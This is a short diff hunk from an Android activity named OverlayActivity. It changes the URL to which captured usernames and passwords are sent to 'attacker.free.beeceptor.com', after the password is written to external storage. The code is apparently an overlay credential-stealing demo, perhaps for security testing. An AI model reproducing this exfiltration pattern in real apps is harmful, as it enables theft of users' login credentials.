@@ -68,7 +68,7 @@ public class OverlayActivity extends AppCompatActivity {
         writeToExternalStorage(password);
         new Thread(() -> {
             try {
-                sendDataOnline(username, password, "https://talsec.free.beeceptor.com");
+                sendDataOnline(username, password, "https://attacker.free.beeceptor.com");
             } catch (Exception e) {
                 Log.e(TAG, "Network operation failed", e);
             }
